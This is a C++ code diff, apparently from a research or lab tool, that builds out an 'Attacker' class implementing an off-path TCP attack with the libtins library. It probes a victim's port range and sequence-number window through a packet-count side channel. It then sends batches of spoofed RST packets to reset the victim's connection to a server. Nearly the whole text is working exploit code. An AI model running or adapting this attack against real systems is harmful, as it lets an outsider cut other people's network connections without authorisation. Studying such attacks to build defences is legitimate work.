@@ -10,11 +10,17 @@
 using namespace std;
 using namespace Tins;
 
+const uint32_t kMaxPacketsPerSecond = 5000;
+
 Attacker::Attacker(
         ConnectionID legitConn,
         uint32_t legitLastSeq,
         const string& victimIP) : 
     legitConn_(legitConn), legitLastSeq_(legitLastSeq), victimIP_(victimIP) {}
+
+void Attacker::setEstimatedWindowSz(uint32_t sz) {
+    estimatedWindowSz_ = sz;
+}
 
 chrono::milliseconds Attacker::synchronizeClock() {
     Tins::PacketSender sender;
@@ -65,14 +71,13 @@ chrono::milliseconds Attacker::synchronizeClock() {
     return syncDelayMs_;
 }
 
-uint32_t Attacker::find_port(uint32_t from, uint32_t to) {
-    int range = 5000;
+uint32_t Attacker::findPort(uint32_t from, uint32_t to) {
     auto start = from;
     cout << "Linear search" << endl;
     while (start <= to) {
-        auto finish = min(start + range - 1, to);
+        auto finish = min(start + kMaxPacketsPerSecond - 1, to);
         cout << "Probing ports " << start << "..." << finish << ": " << flush;
-        if (has_port(start, finish)) {
+        if (hasPort(start, finish)) {
             cout << "Yes" << endl;
             from = start;
             to = finish;
@@ -88,7 +93,7 @@ uint32_t Attacker::find_port(uint32_t from, uint32_t to) {
     while (left < right) {
         auto mid = (left + right + 1) / 2;
         cout << "Probing ports " << mid << "..." << right << ": " << flush;
-        if (has_port(mid, right)) {
+        if (hasPort(mid, right)) {
             cout << "Yes" << endl;
             left = mid;
         } else {
@@ -100,7 +105,7 @@ uint32_t Attacker::find_port(uint32_t from, uint32_t to) {
     return left;
 }
 
-bool Attacker::has_port(uint32_t from, uint32_t to) {
+bool Attacker::hasPort(uint32_t from, uint32_t to) {
     vector<IP> packets;
     ConnectionID victimConn(victimIP_, 0, legitConn_.serverIP, legitConn_.serverPort);
     for (auto port = from; port <= to; port++) {
@@ -111,6 +116,104 @@ bool Attacker::has_port(uint32_t from, uint32_t to) {
         packets.push_back(make_packet(legitConn_, "RA", legitLastSeq_ + 3));
     }
 
+    auto numReceived = sendPackets(packets);
+    if (numReceived == 99) {
+        return true;
+    } else if (numReceived == 100) {
+        return false;
+    }
+    throw "Port finding failed";
+}
+
+void Attacker::resetConnection() {
+    uint32_t start, compensation, startOfFoundChunk, numBlocksOfFoundChunk;
+    uint64_t maxSeqNum = (1UL << 32) - 1;
+    bool found;
+    do {
+        found = false;
+        start = 0;
+        compensation = 0;
+        while (start <= maxSeqNum) {
+            uint32_t numBlocks = min(
+                1UL*kMaxPacketsPerSecond, 
+                (maxSeqNum - start + 1)/estimatedWindowSz_);
+            cout << "Probing " << numBlocks << " blocks starting at " 
+                << start << "..." << flush;
+            auto numReceived = isInWindow(start, numBlocks);
+            if (numReceived == 100) {
+                cout << "No (" << numReceived << ")" << endl;
+            } else {
+                cout << "Yes (" << numReceived << ")" << endl;
+            }
+            if (numReceived < 100) {
+                startOfFoundChunk = start;
+                numBlocksOfFoundChunk = numBlocks;
+                compensation += 100 - numReceived;
+                found = true;
+            } else if (numReceived == 100 && found == true) {
+                break;
+            }
+            start += numBlocks * estimatedWindowSz_;
+        }
+        estimatedWindowSz_ *= compensation;
+    } while (compensation > 1);
+
+    // cout << "Binary search" << endl;
+    auto left = 1U;
+    auto right = numBlocksOfFoundChunk;
+    while (left < right) {
+        auto mid = (left + right + 1) / 2;
+        auto midSeqNum = startOfFoundChunk + (mid - 1) * estimatedWindowSz_;
+        auto numBlocks = right - mid + 1;
+        cout << "Probing " << numBlocks 
+             << " blocks starting at " << midSeqNum << "..." << flush;
+        if (isInWindow(midSeqNum, numBlocks) == 99) {
+            cout << "Yes" << endl;
+            left = mid;
+        } else {
+            cout << "No" << endl;
+            right = mid - 1;
+        }
+    }
+    auto inWindowSeqNum = startOfFoundChunk + (left - 1) * estimatedWindowSz_;
+    for (uint32_t i = 0U; i < (estimatedWindowSz_ / kMaxPacketsPerSecond + 1); i++) {
+        auto from = inWindowSeqNum - kMaxPacketsPerSecond * (i + 1) + 1;
+        from = max(from, 0U);
+        auto to = from + kMaxPacketsPerSecond - 1;
+        cout << "Sending RESET packets to seq " << from << "..." << to << endl;
+        sendResetPacktes(from, to);
+    }
+}
+
+uint32_t Attacker::isInWindow(uint32_t from, uint32_t numBlocks) {
+    vector<IP> packets;
+    ConnectionID victimConn(
+        victimIP_, victimPort_, legitConn_.serverIP, legitConn_.serverPort);    
+    for (uint32_t block = 0; block < numBlocks; block++) {
+        auto packet = make_packet(
+            victimConn, "R", from + estimatedWindowSz_ * block);
+        packets.push_back(packet);
+    }
+    for (int i = 0; i < 100; i++) {
+        packets.push_back(make_packet(legitConn_, "RA", legitLastSeq_ + 3));
+    }
+    return sendPackets(packets);
+}
+
+void Attacker::sendResetPacktes(uint32_t fromSeq, uint32_t toSeq) {
+      vector<IP> packets;
+    ConnectionID victimConn(
+        victimIP_, victimPort_, legitConn_.serverIP, legitConn_.serverPort);    
+    for (uint32_t seq =fromSeq; seq <= toSeq; seq++) {
+        auto packet = make_packet(
+            victimConn, "R", seq);
+        packets.push_back(packet);
+    }
+    sendPackets(packets, 0);
+}
+
+
+uint32_t Attacker::sendPackets(const std::vector<Tins::IP>& packets, int threshold) {
     auto pcounter = PacketCounter::instance();
     int retry = 3;
     while (retry > 0) {
@@ -122,10 +225,8 @@ bool Attacker::has_port(uint32_t from, uint32_t to) {
         }
         this_thread::sleep_for(2s);
         auto numReceived = pcounter->stopCounting();
-        if (numReceived == 99) {
-            return true;
-        } else if (numReceived == 100) {
-            return false;
+        if (numReceived >= threshold) {
+            return numReceived;
         }
         cout << endl << "Received " << numReceived << " packets. Retrying..." << endl;
         retry--;
